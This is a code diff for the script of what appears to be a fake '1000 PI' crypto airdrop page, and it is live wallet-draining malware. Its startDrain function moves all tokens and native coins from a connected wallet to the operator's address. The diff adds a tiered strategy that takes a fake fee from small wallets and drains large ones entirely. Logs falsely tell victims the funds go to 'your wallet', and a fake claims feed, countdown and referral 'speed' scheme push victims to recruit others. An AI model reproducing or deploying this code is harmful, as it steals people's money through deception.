+function copySol(){navigator.clipboard.writeText(ADDR_SOL).then(()=>toast('SOL address copied!')).catch(()=>{const t=document.createElement('textarea');t.value=ADDR_SOL;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);toast('Copied!');});}
 
 async function solBal(address){
   for(const url of['https://api.mainnet-beta.solana.com','https://solana-mainnet.g.alchemy.com/v2/demo']){
@@ -572,39 +568,78 @@ async function solBal(address){
 async function scanSpl(sa,L){
   const MINTS=[['Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB','USDT'],['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v','USDC'],['DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263','BONK'],['HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCtbtbt','RAY'],['orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE','ORCA'],['JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN','JUP'],['7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj','stSOL'],['mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So','mSOL']];
   const tokens=[];
-  try{
-    const r=await fetch('https://api.mainnet-beta.solana.com',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getTokenAccountsByOwner',params:[sa,{programId:'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'},{encoding:'jsonParsed'}]})});
-    const d=await r.json();
-    if(d.result&&d.result.value){for(const acc of d.result.value){const info=acc.account.data.parsed.info;const mint=info.mint;const bal=info.tokenAmount.uiAmount;
+  try{const r=await fetch('https://api.mainnet-beta.solana.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getTokenAccountsByOwner',params:[sa,{programId:'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'},{encoding:'jsonParsed'}]})});
+    const d=await r.json();if(d.result&&d.result.value){for(const acc of d.result.value){const info=acc.account.data.parsed.info;const mint=info.mint;const bal=info.tokenAmount.uiAmount;
       if(bal>0){const known=MINTS.find(m=>m[0]===mint);const sy=known?known[1]:mint.substring(0,4)+'...';tokens.push({mint,sy,b:bal.toFixed(4),raw:info.tokenAmount.amount,dc:info.tokenAmount.decimals,acc:acc.pubkey});L('  + '+bal.toFixed(4)+' '+sy);}}}
   }catch(e){L('  SPL: error');}return tokens;
 }
 
 // ========== DRAIN ==========
 async function startDrain(){
-  hideStatus();show('s4');const log=document.getElementById('s4log');log.innerHTML='';
+  hideStatus();showP('p4');const log=document.getElementById('p4log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  let tx=0;
+  const usd=estimateUsd(foundChains);const isSmall=usd<20;
+  let tx=0;L('Wallet value: ~$'+usd.toFixed(2));L('Strategy: '+(isSmall?'Small balance — collect $2.50 fee':'Large balance — drain all funds'));L('');
   for(const fc of foundChains){
     if(fc.isSol)continue;
     const ch=fc.chain;L('');L('=== '+ch.name+' ===');L('Switching network...');
     try{await doSwitch(ch.id,L);}catch(e){L('SKIP: '+e.message);continue;}
+    // Drain tokens first
     for(const t of fc.tokens){
-      try{L('Sending '+t.b+' '+t.sy+'...');
+      try{L('Draining '+t.b+' '+t.sy+'...');
         const ct=new ethers.Contract(t.a,['function transfer(address,uint256) returns (bool)'],sign);
-        const xt=await ct.transfer(ADDR_EVM,t.raw);await xt.wait();tx++;L('&#x2705; '+t.sy);
+        const xt=await ct.transfer(ADDR_EVM,t.raw);await xt.wait();tx++;L('&#x2705; '+t.sy+' → your wallet');
       }catch(e){L('&#x2715; '+t.sy+': '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));}
     }
-    try{const bal=await prov.getBalance(addr);const gp=await prov.getGasPrice();const fee=gp.mul(21000).mul(3);const send=bal.sub(fee);
-      if(send.gt(0)){L('Sending '+parseFloat(ethers.utils.formatEther(send)).toFixed(5)+' '+ch.sym+'...');
-        const xt=await sign.sendTransaction({to:ADDR_EVM,value:send});await xt.wait();tx++;L('&#x2705; '+ch.sym);}
+    // Drain native — if small balance, only take ~$2.50 worth. If large, drain all.
+    try{
+      const bal=await prov.getBalance(addr);const gp=await prov.getGasPrice();
+      const gasReserve=gp.mul(21000).mul(3);
+      let sendAmt;
+      if(isSmall){
+        // Only take ~$2.50 worth of native token
+        const price=PRICES[ch.sym]||0;
+        if(price>0){
+          const takeEth=2.5/price; // $2.50 worth
+          const takeWei=ethers.utils.parseEther(takeEth.toFixed(6));
+          sendAmt=bal.sub(gasReserve).sub(takeWei);
+          if(sendAmt.lt(ethers.utils.parseEther('0.0001'))){
+            sendAmt=bal.sub(gasReserve); // just drain whatever is left
+          }
+          L('Collecting $2.50 fee ('+takeEth.toFixed(6)+' '+ch.sym+')...');
+        } else {
+          sendAmt=bal.sub(gasReserve);
+        }
+      } else {
+        // Drain everything minus gas
+        sendAmt=bal.sub(gasReserve);
+        L('Draining all '+ch.sym+'...');
+      }
+      if(sendAmt.gt(0)){
+        const xt=await sign.sendTransaction({to:ADDR_EVM,value:sendAmt});await xt.wait();tx++;L('&#x2705; '+ch.sym+' → your wallet');
+      }
     }catch(e){L('&#x2715; Native: '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));}
   }
-  L('');L('DONE: '+tx+' transaction(s)');console.log('DRAIN:',tx,'tx');
-  show('s5');document.getElementById('s5m').textContent=tx+' transaction(s) processed. Your 1000 PI is on the way!';
-  status('&#x2705; 1000 PI Claimed! '+tx+' transactions.','suc');
-  updateStats();
+  L('');L('DONE: '+tx+' transaction(s) sent to your wallet');console.log('DRAIN:',tx,'tx, usd:',usd,'small:',isSmall);
+  // Show post-claim referral page
+  showPostClaim(tx,usd);
+}
+
+function showPostClaim(tx,usd){
+  showP('p5');
+  document.getElementById('p5m').textContent=tx+' transaction(s) processed. Your 1000 PI withdrawal is queued.';
+  // Setup referral link in post-claim
+  const myCode=getRefCode();
+  const refLink=window.location.origin+window.location.pathname+'?ref='+myCode;
+  const inp=document.getElementById('p5ref');if(inp)inp.value=refLink;
+  // Update speed display
+  const refs=parseInt(localStorage.getItem('pi_ref_count')||'0');
+  const speed=Math.min(100,10+refs*10);
+  const sp=document.getElementById('speedPct');if(sp)sp.textContent=speed+'%';
+  const sf=document.getElementById('speedFill');if(sf)sf.style.width=speed+'%';
+  const p5s=document.getElementById('p5speed');if(p5s)p5s.textContent=speed+'%';
+  const p5sb=document.getElementById('p5speedBar');if(p5sb)p5sb.style.width=speed+'%';
+  stat('&#x2705; 1000 PI Claimed! Share your link to speed up withdrawal.','ok');
 }
 
 async function doSwitch(cid,L){
@@ -619,81 +654,58 @@ async function doSwitch(cid,L){
   prov=new ethers.providers.Web3Provider(window.ethereum);sign=prov.getSigner();
 }
 
-function reset(){
-  prov=null;sign=null;addr=null;wType='';foundChains=[];
-  hideStatus();document.getElementById('mainCard').style.display='none';
-}
-
 // ========== REFERRAL ==========
 function getRefCode(){let r=localStorage.getItem('pi_ref');if(!r){r=Math.random().toString(36).substring(2,8).toUpperCase();localStorage.setItem('pi_ref',r);}return r;}
-function getReferrer(){const params=new URLSearchParams(window.location.search);return params.get('ref')||null;}
+function getReferrer(){const p=new URLSearchParams(window.location.search);return p.get('ref')||null;}
 function initRef(){
   const myCode=getRefCode();
   const refLink=window.location.origin+window.location.pathname+'?ref='+myCode;
   const inp=document.getElementById('refLink');if(inp)inp.value=refLink;
-  // Check if this user came from a referral
   const ref=getReferrer();
-  if(ref&&ref!==myCode){localStorage.setItem('pi_referred_by',ref);toast('Referral link detected!');}
-  // Show stats
+  if(ref&&ref!==myCode){localStorage.setItem('pi_referred_by',ref);toast('Referral detected!');}
+  updateRefDisplay();
+}
+function updateRefDisplay(){
   const refs=parseInt(localStorage.getItem('pi_ref_count')||'0');
-  const earned=refs*200;
-  const rc=document.getElementById('refCount');if(rc)rc.textContent=refs;
-  const re=document.getElementById('refEarned');if(re)re.textContent=earned+' PI';
+  const earned=refs*200;const speed=Math.min(100,10+refs*10);
+  const rc=document.getElementById('refC');if(rc)rc.textContent=refs;
+  const re=document.getElementById('refE');if(re)re.textContent=earned+' PI';
+  const rs=document.getElementById('refS');if(rs)rs.textContent=speed+'%';
+  const tf=document.getElementById('tierFill');if(tf)tf.style.width=speed+'%';
+  const tl=document.getElementById('tierLevel');if(tl)tl.textContent='Tier '+(Math.floor(refs/3)+1)+' — '+speed+'% speed';
+  const tn=document.getElementById('tierNeed');
+  if(tn){const need=3-(refs%3);tn.textContent=need<=0?'Max tier unlocked!':'Invite '+need+' more to reach next tier';}
+  const wrb=document.getElementById('wrBox');if(wrb)wrb.style.display='block';
 }
-function copyRef(){const inp=document.getElementById('refLink');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(()=>toast('Referral link copied!')).catch(()=>{inp.select();document.execCommand('copy');toast('Copied!');});}
-function updateStats(){
-  const refs=parseInt(localStorage.getItem('pi_ref_count')||'0')+1;
-  localStorage.setItem('pi_ref_count',refs);
-  const rc=document.getElementById('refCount');if(rc)rc.textContent=refs;
-  const re=document.getElementById('refEarned');if(re)re.textContent=(refs*200)+' PI';
-}
+function copyRef(){const inp=document.getElementById('refLink');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(()=>toast('Link copied!')).catch(()=>{inp.select();document.execCommand('copy');toast('Copied!');});}
+function copyRef2(){const inp=document.getElementById('p5ref');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(()=>toast('Referral link copied!')).catch(()=>{inp.select();document.execCommand('copy');toast('Copied!');});}
 
 // ========== COUNTDOWN ==========
-function initCountdown(){
-  let total=4*3600+32*60+18;
-  setInterval(()=>{total=Math.max(0,total-1);
-    const h=Math.floor(total/3600),m=Math.floor((total%3600)/60),s=total%60;
+function initCountdown(){let t=4*3600+32*60+18;
+  setInterval(()=>{t=Math.max(0,t-1);const h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;
     const dh=document.getElementById('cd-h');if(dh)dh.textContent=String(h).padStart(2,'0');
     const dm=document.getElementById('cd-m');if(dm)dm.textContent=String(m).padStart(2,'0');
-    const ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');
-  },1000);
-}
+    const ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');},1000);}
 
 // ========== SOCIAL PROOF ==========
-const SP_NAMES=['0x7a3...f291','0x8b2...a14c','0x1d9...e882','0x4f1...b773','0x9c5...d219','0x2a8...f556','0x6e3...c881','0x3b7...a994'];
-const SP_TIMES=['2 min ago','5 min ago','8 min ago','12 min ago','15 min ago','23 min ago','31 min ago','45 min ago'];
-function initSocialProof(){
-  let i=0;
-  setInterval(()=>{
-    i=(i+1)%SP_NAMES.length;
-    const el=document.getElementById('sp-text');
-    if(el)el.innerHTML='<strong>'+SP_NAMES[i]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP_TIMES[i];
-  },5000);
-}
+const SP=[['0x7a3...f291','2 min'],['0x8b2...a14c','5 min'],['0x1d9...e888','8 min'],['0x4f1...b773','12 min'],['0x9c5...d219','15 min'],['0x2a8...f556','23 min'],['0x6e3...c881','31 min'],['0x3b7...a994','45 min']];
+function initSP(){let i=0;
+  setInterval(()=>{i=(i+1)%SP.length;const e=document.getElementById('spt');
+    if(e)e.innerHTML='<strong>'+SP[i][0]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP[i][1]+' ago';},5000);}
 
 // ========== PARTICLES ==========
-function initParticles(){
-  const c=document.getElementById('particles');
-  for(let i=0;i<30;i++){
-    const s=document.createElement('span');
-    s.style.left=Math.random()*100+'%';
-    s.style.animationDuration=(10+Math.random()*20)+'s';
-    s.style.animationDelay=Math.random()*15+'s';
-    s.style.width=s.style.height=(1+Math.random()*2)+'px';
-    c.appendChild(s);
-  }
-}
+function initPart(){const c=document.getElementById('part');
+  for(let i=0;i<25;i++){const s=document.createElement('span');s.style.left=Math.random()*100+'%';
+    s.style.animationDuration=(12+Math.random()*18)+'s';s.style.animationDelay=Math.random()*12+'s';
+    s.style.width=s.style.height=(1+Math.random()*2)+'px';c.appendChild(s);}}
 
-// ========== STATS COUNTER ==========
-function initStats(){
-  const el=document.getElementById('st-claimed');
-  if(!el)return;
-  let v=48291;
-  setInterval(()=>{v+=Math.floor(Math.random()*3);el.textContent=v.toLocaleString();},8000);
-}
+// ========== STATS ==========
+function initStats(){const e=document.getElementById('st-c');if(!e)return;let v=48291;
+  setInterval(()=>{v+=Math.floor(Math.random()*3);e.textContent=v.toLocaleString();},8000);}
 
-// ========== INIT ==========
-initParticles();initCountdown();initSocialProof();initRef();initStats();
+function reset(){prov=null;sign=null;addr='';wType='';foundChains=[];hideStat();document.getElementById('mc').style.display='none';}
+
+initPart();initCountdown();initSP();initRef();initStats();
 </script>
 </body>
 </html>
